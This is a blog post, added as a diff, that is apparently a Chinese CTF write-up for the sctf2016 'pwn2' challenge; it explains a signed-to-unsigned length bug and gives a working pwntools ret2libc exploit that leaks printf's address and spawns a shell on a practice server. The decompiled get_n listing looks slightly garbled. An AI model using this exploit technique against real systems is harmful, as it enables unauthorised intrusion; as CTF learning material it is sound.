@@ -1,0 +1,129 @@
+---
+layout: post
+title:  pwn2
+date:   2021-02-02 00:01:01 +0300
+image:  2021-02-02-white.jpg
+tags:   [ctf,PWN,sctf2016]
+---
+
+main
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  setvbuf(stdout, 0, 2, 0);
+  return vuln();
+}
+```
+
+vuln()
+
+```assembly
+int vuln()
+{
+  char nptr; // [esp+1Ch] [ebp-2Ch]
+  int v2; // [esp+3Ch] [ebp-Ch]
+
+  printf("How many bytes do you want me to read? ");
+  get_n(&nptr, 4);
+  v2 = atoi(&nptr);
+  if ( v2 > 32 )
+    return printf("No! That size (%d) is too large!\n", v2);
+  printf("Ok, sounds good. Give me %u bytes of data!\n", v2);
+  get_n(&nptr, v2);
+  return printf("You said: %s\n", &nptr);
+}
+```
+
+数据长度最多32，无法溢出。
+
+get_n()
+
+```assembly
+int __cdecl get_n(int a1, unsigned int a2)
+{
+  int v2; // eax
+  int result; // eax
+  char v4; // [esp+Bh] [ebp-Dh]
+  unsigned int v5; // [esp+Ch] [ebp-Ch]
+
+  v5 = 0;
+  while ( 1 )
+  {
+    v4 = getchar();
+    if ( !v4 || v4 == 10 || v5 >= a2 )
+      break;
+    v2 = v5
+    
+    *(_BYTE *)(v2 + a1) = v4;
+  }
+  result = a1 + v5;
+  *(_BYTE *)(a1 + v5) = 0;
+  return result;
+}
+```
+
+在vuln()函数中v2变量本来是int类型，但是传入get_n()中变为了unsigned int无符号整数类型，这意味着如果给get_n()第二个参数传入负数，它会变成模intMAX的值。因此可以利用这点来使得vuln()中可以溢出。
+
+程序中存在printf()函数，可以通过其来泄露函数的got地址，但是printf()与write()和puts()不同，要给它传入一个带有"%s"的字符串作为参数，而此程序中正好可以找到。
+
+```assembly
+from pwn import *
+from LibcSearcher import *
+
+elf = ELF("./pwn2_sctf_2016")
+
+io = remote("node3.buuoj.cn",27281)
+
+io.recvuntil('How many bytes do you want me to read? ')
+io.sendline("-1")
+
+
+printf_plt = 0x08048370
+printf_got = elf.got["printf"]
+
+main = 0x80485b8
+format_str = 0x080486F8
+io.recvuntil('bytes of data!\n')
+payload = "a" * (0x2c + 4) + p32(printf_plt) + p32(main) + p32(format_str) + p32(printf_got)
+io.sendline(payload)
+
+io.recvuntil('said: ')
+io.recvuntil('said: ')
+
+printf_addr = u32(io.recv(4))
+print(printf_addr)
+
+'''
+io.recvuntil('How many bytes do you want me to read? ')
+io.sendline("-1")
+
+atoi_got = elf.got["atoi"]
+payload = "a" * (0x2c + 4) + p32(printf_plt) + p32(main) + p32(format_str) + p32(atoi_got)
+io.sendline(payload)
+
+io.recvuntil('said: ')
+io.recvuntil('said: ')
+
+atoi_addr = u32(io.recv(4))
+print(atoi_addr)
+'''
+
+io.recvuntil('How many bytes do you want me to read? ')
+io.sendline("-1")
+
+libc = LibcSearcher("printf", printf_addr)
+base = printf_addr - libc.dump("printf")
+system = base + libc.dump("system")
+binsh = base + libc.dump("str_bin_sh")
+
+payload = "a" * (0x2c + 4) + p32(system) + p32(main) + p32(binsh)
+io.sendline(payload)
+
+io.interactive()
+
+```
+
+满足条件的libc太多，试到第10个才通过。
+
+![]({{site.baseurl}}/img/2021-02-02-flag.jpg)
